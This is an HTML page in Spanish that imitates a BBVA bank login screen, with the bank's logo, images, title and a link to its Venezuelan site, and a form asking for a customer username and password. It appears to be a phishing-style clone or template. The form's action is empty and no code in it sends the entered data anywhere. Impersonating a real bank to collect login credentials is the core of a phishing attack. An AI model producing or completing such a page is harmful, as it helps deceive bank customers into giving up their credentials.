<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      body {
        font-family: Arial, sans-serif;
        background-color: #f0f0f0;
        background-image: url(https://www.bbva.com/wp-content/uploads/2021/07/suscribirse-newsletter-sostenibilidad-BBVA.jpg);
        background-size: cover;
      }
      .root {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }

      .content {
        background-color: #fff;
        padding: 20px;
        width: 500px;
        height: 400px;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      }
      .conte-logo {
        display: flex;
        justify-content: center;
        position: absolute;
        height: 200px;
        width: 100%;
      }
      .logo {
        margin-top: 20px;
      }
      .welcom {
        text-align: center;
        margin-bottom: 10px;
      }
      .welcom h2 {
        color: rgb(5, 16, 110);
        font-size: 30px;
      }
      .welcom p {
        color: #292828;
        font-size: 14px;
        font-style: italic;
      }
      form {
        display: flex;
        flex-direction: column;
        justify-content: center;
        padding: 20px;
        height: 87%;
      }

      label {
        font-weight: bold;
        margin-top: 10px;
        margin-bottom: 5px;
      }

      .input {
        display: flex;
        align-items: center;
        gap: 5px;
      }
      svg {
        color: #292828;
      }

      .icon {
        background-color: rgb(0, 5, 48);
        padding: 8px;
        border-radius: 4px;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      input:not(.btn) {
        font-size: 16px;
        width: 100%;
        padding: 10px;
        outline: none;
      }

      input:focus {
        border: 2px solid rgb(2, 11, 94);
        border-radius: 4px;
      }

      input::placeholder {
        color: #ccc;
        font-style: italic;
      }

      .btn {
        background-color: rgb(0, 5, 48);
        color: white;
        border: none;
        padding: 20px;
        border-radius: 4px;
        cursor: pointer;
        margin-top: 10px;
      }
      .btn:hover {
        background-color: rgb(2, 11, 94);
      }
      .divider {
        text-align: center;
      }
    </style>
    <link
      rel="icon"
      href="https://es.marketscreener.com/static/private-issuer-squared-740EG.png"
    />
    <title>Bienvenido | BBVA</title>
  </head>
  <body>
    <div class="conte-logo">
      <div class="logo">
        <a
          href="https://www.provincial.com/personas.html"
          target="_blank"
          rel="noopener noreferrer"
          ><img
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/BBVA_2019.svg/1280px-BBVA_2019.svg.png"
            alt="logo bbva"
            width="300"
        /></a>
      </div>
    </div>
    <div class="root">
      <div class="content">
        <div class="welcom">
          <h2>Bienvenido a BBVA</h2>
          <p>Por favor, ingresa tus datos para continuar</p>
        </div>
        <form action="">
          <label for="user">Usuario:</label>
          <div class="input">
            <div class="icon">
              <svg
                width="30px"
                height="30px"
                viewBox="0 0 24 24"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                <g
                  id="SVGRepo_tracerCarrier"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                ></g>
                <g id="SVGRepo_iconCarrier">
                  <circle
                    cx="12"
                    cy="6"
                    r="4"
                    stroke="#ffffff"
                    stroke-width="1.5"
                  ></circle>
                  <path
                    d="M19.9975 18C20 17.8358 20 17.669 20 17.5C20 15.0147 16.4183 13 12 13C7.58172 13 4 15.0147 4 17.5C4 19.9853 4 22 12 22C14.231 22 15.8398 21.8433 17 21.5634"
                    stroke="#ffffff"
                    stroke-width="1.5"
                    stroke-linecap="round"
                  ></path>
                </g>
              </svg>
            </div>
            <input
              type="text"
              id="user"
              name="user"
              placeholder="Usuario cliente"
              required
            />
          </div>
          <br />
          <label for="Contraseña">Contraseña:</label>
          <div class="input">
            <div class="icon">
              <svg
                width="30px"
                height="30px"
                viewBox="0 0 24 24"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
                stroke="#0400d6"
              >
                <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                <g
                  id="SVGRepo_tracerCarrier"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke="#CCCCCC"
                  stroke-width="0.72"
                ></g>
                <g id="SVGRepo_iconCarrier">
                  <path
                    d="M12 10V14M10.2676 11L13.7317 13M13.7314 11L10.2673 13"
                    stroke="#ffffff"
                    stroke-width="1.5"
                    stroke-linecap="round"
                  ></path>
                  <path
                    d="M6.73241 10V14M4.99999 11L8.46409 13M8.46386 11L4.99976 13"
                    stroke="#ffffff"
                    stroke-width="1.5"
                    stroke-linecap="round"
                  ></path>
                  <path
                    d="M17.2681 10V14M15.5356 11L18.9997 13M18.9995 11L15.5354 13"
                    stroke="#ffffff"
                    stroke-width="1.5"
                    stroke-linecap="round"
                  ></path>
                  <path
                    d="M22 12C22 15.7712 22 17.6569 20.8284 18.8284C19.6569 20 17.7712 20 14 20H10C6.22876 20 4.34315 20 3.17157 18.8284C2 17.6569 2 15.7712 2 12C2 8.22876 2 6.34315 3.17157 5.17157C4.34315 4 6.22876 4 10 4H14C17.7712 4 19.6569 4 20.8284 5.17157C21.4816 5.82475 21.7706 6.69989 21.8985 8"
                    stroke="#ffffff"
                    stroke-width="1.5"
                    stroke-linecap="round"
                  ></path>
                </g>
              </svg>
            </div>
            <input
              type="password"
              id="Contraseña"
              name="Contraseña"
              placeholder="**********"
              required
            />
          </div>
          <br />
          <input class="btn" type="submit" value="ENVIAR" />
          <br />
          <div class="divider">
            <p>¿Aún no eres cliente?, <a href="#">Regístrate</a></p>
          </div>
        </form>
      </div>
    </div>
  </body>
</html>
